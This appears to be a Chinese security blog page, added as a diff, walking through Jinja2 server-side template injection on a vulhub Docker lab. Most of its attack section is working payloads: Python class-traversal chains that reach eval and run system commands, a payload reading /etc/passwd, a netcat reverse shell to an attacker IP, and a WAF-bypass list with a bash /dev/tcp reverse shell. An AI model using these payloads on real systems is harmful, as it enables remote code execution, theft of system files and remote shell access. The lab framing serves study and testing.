@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="漏洞描述 声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！ 我其实根本就没用过flask模板，但因为种种的研究原因，还是在此记录一下。 参考链接：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;leixiao-&#x2F;p&#x2F;10227867.html 参考链接：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;hackxf&#x2F;p&#x2F;1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jinja2服务端模板注入漏洞">
+<meta property="og:url" content="http://example.com/2021/12/25/Jinja2%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="cat-nineteen">
+<meta property="og:description" content="漏洞描述 声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！ 我其实根本就没用过flask模板，但因为种种的研究原因，还是在此记录一下。 参考链接：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;leixiao-&#x2F;p&#x2F;10227867.html 参考链接：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;hackxf&#x2F;p&#x2F;1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211224101623358.png">
+<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211224102350273.png">
+<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211224102054256.png">
+<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211224103616805.png">
+<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211224104826984.png">
+<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211224104742298.png">
+<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211224110020995.png">
+<meta property="article:published_time" content="2021-12-25T06:20:46.963Z">
+<meta property="article:modified_time" content="2021-12-25T06:36:56.458Z">
+<meta property="article:author" content="longer">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211224101623358.png">
+
+<link rel="canonical" href="http://example.com/2021/12/25/Jinja2%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Jinja2服务端模板注入漏洞 | cat-nineteen</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">cat-nineteen</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/25/Jinja2%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="longer">
+      <meta itemprop="description" content="不愿分享小故事的脚本小子成不了心灵骇客！">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cat-nineteen">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Jinja2服务端模板注入漏洞
+        </h1>
+
+        <div class="post-meta">
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-12-25 14:20:46 / 修改时间：14:36:56" itemprop="dateCreated datePublished" datetime="2021-12-25T14:20:46+08:00">2021-12-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">WEB安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
+<p>我其实根本就没用过flask模板，但因为种种的研究原因，还是在此记录一下。</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/leixiao-/p/10227867.html">https://www.cnblogs.com/leixiao-/p/10227867.html</a></p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hackxf/p/10480071.html">https://www.cnblogs.com/hackxf/p/10480071.html</a></p>
+<span id="more"></span>
+
+<h3 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h3><p>  Flask 是一个 web 框架。也就是说 Flask 为你提供工具，库和技术来允许你构建一个 web 应用程序。这个 wdb 应用程序可以使一些 web 页面、博客、wiki、基于 web 的日历应用或商业网站。<br>  Flask 属于微框架（micro-framework）这一类别，微架构通常是很小的不依赖于外部库的框架。这既有优点也有缺点，优点是框架很轻量，更新时依赖少，并且专注安全方面的 bug，缺点是，你不得不自己做更多的工作，或通过添加插件增加自己的依赖列表。Flask 的依赖如下：</p>
+<ul>
+<li>Werkzeug 一个 WSGI 工具包</li>
+<li>jinja2 模板引擎</li>
+</ul>
+<p>下面是Flask版的hello world(hello-demo.py):</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span>    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p>安装flask即可运行了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ pip install Flask</span><br><span class="line"></span><br><span class="line">$ python hello.py</span><br><span class="line">* Running on http://localhost:<span class="number">5000</span>/</span><br><span class="line"> </span><br><span class="line">*flask默认端口是<span class="number">5000</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Jinja-2"><a href="#Jinja-2" class="headerlink" title="Jinja 2"></a>Jinja 2</h3><ul>
+<li>Jinja 2是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的</li>
+<li>Jinja2 是 Flask 框架的一部分。Jinja2 会把模板参数提供的相应的值替换了<code>&#123;&#123;…&#125;&#125;</code>块</li>
+<li>Jinja2 模板同样支持控制语句，像在 <code>&#123;%…%&#125; </code>块中</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="comment"># This is jinja code</span></span><br><span class="line">   <span class="comment"># 控制结构</span></span><br><span class="line">    &#123;% <span class="keyword">for</span> file <span class="keyword">in</span> filenames %&#125;</span><br><span class="line">        <span class="comment"># 取值</span></span><br><span class="line">        &#123;&#123; file &#125;&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line"><span class="comment">#&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>1. docker搭建；</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># centos 7</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /vulhub/flask/ssti</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>浏览器访问：<a target="_blank" rel="noopener" href="http://192.168.220.132:8000/">http://192.168.220.132:8000</a></p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211224101623358.png" alt="image-20211224101623358"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>进入容器看一下web服务的代码；</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211224102350273.png" alt="image-20211224102350273"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">&quot;Hello &quot;</span> + name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p>看到Template(“Hello “ +name)，Template()完全可控，那么就可以直接写入jinja2的模板语言，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.220.132:8000/?name=&#123;&#123;2*3*3*3&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211224102054256.png" alt="image-20211224102054256"></p>
+<p><strong>由此就可以看出，这完全是开发人员的编码不当才会导致存在有模板注入的漏洞</strong></p>
+<h3 id="利用python特性逃逸"><a href="#利用python特性逃逸" class="headerlink" title="利用python特性逃逸"></a>利用python特性逃逸</h3><p>Jinja2 模板中可以访问一些 Python 内置变量，如[] {} 等，并且能够使用 Python 变量类型中的一些函数；</p>
+<p>python的内敛函数真是强大，可以调用一切函数做自己想做的事情，Python中一些常见的特殊方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__bases__</span><br><span class="line">以元组返回一个类直接所继承的类</span><br><span class="line">__mro__</span><br><span class="line">以元组返回继承关系链</span><br><span class="line">__class__</span><br><span class="line">返回对象所属的类</span><br><span class="line">__globals__</span><br><span class="line">以dict返回函数所在模块命名空间中的所有变量</span><br><span class="line">__subclasses__()</span><br><span class="line">以列表返回类的子类</span><br><span class="line"></span><br><span class="line">#思路就是从一个内置变量调用__class__.base__等隐藏属性，去找到一个函数，然后调用其__globals[&#x27;builtins&#x27;]即可调用eval等执行任意代码。</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line"></span><br><span class="line">#builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__subclasses__()</span><br><span class="line"># 返回子类的列表 [,,,...]</span><br><span class="line"></span><br><span class="line">#从中随便选一个类,查看它的__init__</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__subclasses__()[30].__init__</span><br><span class="line">&lt;slot wrapper &#x27;__init__&#x27; of &#x27;object&#x27; objects&gt;</span><br><span class="line"># wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性</span><br><span class="line"></span><br><span class="line">#再换几个子类，很快就能找到一个重载过__init__的类，比如</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__subclasses__()[5].__init__</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__subclasses__()[5].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]</span><br><span class="line">#然后用eval执行命令即可</span><br></pre></td></tr></table></figure>
+
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>安全研究员给出的几个常见命令执行Payload；</p>
+<p>1.获取eval函数并执行任意python代码的POC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.220.132:8000/?name=</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211224103616805.png" alt="image-20211224103616805"></p>
+<p>2.用jinja的语法即为（执行命令使用os.popen(‘whoami’).read()才有执行结果的回显）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.220.132:8000/?name=</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__==&#x27;_IterationGuard&#x27; %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>3.python3没有file了，所以可以用open</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.220.132:8000/?name=</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211224104826984.png" alt="image-20211224104826984"></p>
+<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p>1.用open操作文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.220.132:8000/?name=</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211224104742298.png" alt="image-20211224104742298"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>无法使用bash反弹shell，只能在容器中下载netcat；</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker中下载netcat</span></span><br><span class="line">apt install netcat</span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击机中开启端口监听</span></span><br><span class="line">nc -lvvp 2333</span><br><span class="line"></span><br><span class="line"><span class="comment"># 浏览器执行payload</span></span><br><span class="line">http://192.168.220.132:8000/?name=</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;nc -e /bin/bash IP 2333&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211224110020995.png" alt="image-20211224110020995"></p>
+<h3 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h3><p>还没测试，test payload来自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hackxf/">晓枫</a>，有时间再搞一哈</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">python2：</span><br><span class="line">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#x27;os.system(&quot;ls&quot;)&#x27;)</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#x27;func_global&#x27;+&#x27;s&#x27;)[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/172.6.6.6/9999 0&gt;&amp;1&quot;&#x27;)</span><br><span class="line"></span><br><span class="line">python3：</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;]</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#x27;__global&#x27;+&#x27;s__&#x27;)[&#x27;os&#x27;].__dict__[&#x27;system&#x27;](&#x27;ls&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="https://gitee.com/cat-nineteen/blog/raw/master/imgs/guanzhu.png">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/12/24/LaravelDebugmode%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-3129)/" rel="prev" title="LaravelDebugmode远程代码执行漏洞(CVE-2021-3129)">
+      <i class="fa fa-chevron-left"></i> LaravelDebugmode远程代码执行漏洞(CVE-2021-3129)
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
